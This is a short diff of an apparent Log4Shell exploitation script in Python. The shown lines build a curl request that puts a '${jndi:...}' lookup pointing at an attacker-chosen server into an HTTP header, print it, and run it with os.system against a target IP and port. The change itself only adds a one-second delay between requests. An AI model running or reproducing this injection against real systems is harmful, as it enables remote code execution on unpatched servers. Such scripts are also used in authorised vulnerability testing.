@@ -107,6 +107,7 @@ def main():
         attcurl = "curl "+tip+":"+tpt+" -H '"+str(headers[hname]).replace("\n", "")+": ${jndi:"+str(servers[sname]).replace("\n", "")+"'}"
         print(attcurl)
         os.system(attcurl)
+        time.sleep(1)
 
 def sn(pkt) :
     global tip
